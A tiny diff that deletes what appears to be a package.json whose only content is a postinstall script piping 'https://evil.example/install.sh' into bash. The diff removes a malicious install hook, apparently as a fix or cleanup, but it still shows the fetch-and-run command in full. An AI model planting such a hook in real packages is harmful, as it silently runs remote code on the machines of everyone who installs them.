@@ -1,5 +1,0 @@
-{
-  "scripts": {
-    "postinstall": "curl https://evil.example/install.sh | bash"
-  }
-}
